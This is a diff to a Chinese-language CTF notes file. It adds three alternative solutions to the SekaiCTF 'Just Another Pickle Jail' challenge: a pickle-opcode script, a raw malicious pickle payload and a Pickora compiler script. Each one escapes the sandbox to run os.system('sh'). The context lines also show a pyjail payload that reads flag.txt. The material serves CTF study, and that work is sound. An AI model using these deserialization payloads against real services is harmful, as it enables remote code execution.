@@ -496,6 +496,74 @@ print(base64.b64encode(temp.encode()))
   - `[lm:=().__class__.__base__.__subclasses__()[104].load_module,p:=__import__("os").pipe,_ps:=lm("_posixsubprocess"),_ps.fork_exec([b"/bin/cat", b"flag.txt"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(p()), False, False, None, None, None, -1, None)]`
 - [wow it's another pyjail](https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/wow%20its%20another%20pyjail)
   - 有关RestrictedPython的漏洞。可以利用format访问用下划线开头的属性（这类属性正常情况下是被保护的，无法直接访问）
+- [Just Another Pickle Jail](https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/misc/just-another-pickle-jail)
+  - 其他解：
+  ```py
+  mgk = GLOBAL('', 'mgk')
+  up = GLOBAL('', 'up')
+  __main__ = GLOBAL('', '__main__')
+  __getattribute__ = GLOBAL('', '__getattribute__')
+  __init__ = GLOBAL('', '__init__')
+  __builtins__ = GLOBAL('', '__builtins__')
+  BUILD(up, None, {'banned': [], '__import__': __init__})
+  BUILD(mgk, None, {'nested': up})
+  BUILD(__main__, None, {'__main__': __builtins__})
+  BUILD(up, None, {'__import__': __getattribute__})
+  builtins_get = GLOBAL('', 'get')
+  BUILD(up, None, {'__import__': __init__})
+  BUILD(up, None, {'persistent_load': builtins_get})
+  exec = PERSID('exec')
+  BUILD(up, None, {'persistent_load': exec})
+  PERSID('sys.modules["os"].system("sh")')
+  ```
+  ```py
+  b'''c\n__main__\n\x94c\n__builtins__\n\x94b0c\n__getattribute__\n\x940c\nmgk\n\x940c\nup\n\x940h\3N(S"banned"\n]S"__import__"\nc\ntuple\nS"nested"\nh\3d\x86b0h\0N(S"__main__"\nh\1d\x86b0h\3N(S"__import__"\nh\2d\x86b0h\4(S"persistent_load"\nc\n__getitem__\ndb(S"persistent_load"\nPexec\ndb0Pnext(x for x in object.__subclasses__() if 'BuiltinImporter' in str(x)).load_module("os").system("sh")\n.'''
+  ```
+  ```py
+  import sys
+  sys.path.insert(0, "./Pickora")
+  from pickora import Compiler
+  import pickletools
+  def unary(result_name, fn_name, arg_name):
+      return f"""__builtins__['next'] = {fn_name}
+  up._buffers = {arg_name}
+  {result_name} = NEXT_BUFFER()
+  """
+  pk = Compiler().compile(
+      f"""
+  from x import Unpickler, __main__, __builtins__, up
+  BUILD(__main__,__builtins__,None)
+  from x import getattr, print, vars, dir, object, type, dict, list
+  {unary('val', 'vars', 'dict')}
+  BUILD(__main__,val,None)
+  from x import values as dictvalues
+  {unary('val', 'vars', 'list')}
+  BUILD(__main__,val,None)
+  from x import pop as listpop
+  {unary('val', 'vars', 'list')}
+  BUILD(__main__,val,None)
+  from x import reverse as listreverse
+  {unary('bl', 'dictvalues', '__builtins__')}
+  {unary('bl', 'list', 'bl')}
+  {unary('_', 'listreverse', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  s = 'object.mgk.nested.__import__("os").system("sh")'
+  {unary('val', 'val', 's')}
+  """
+  )
+  ```
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 ```python
 p=remote("",443,ssl=True)
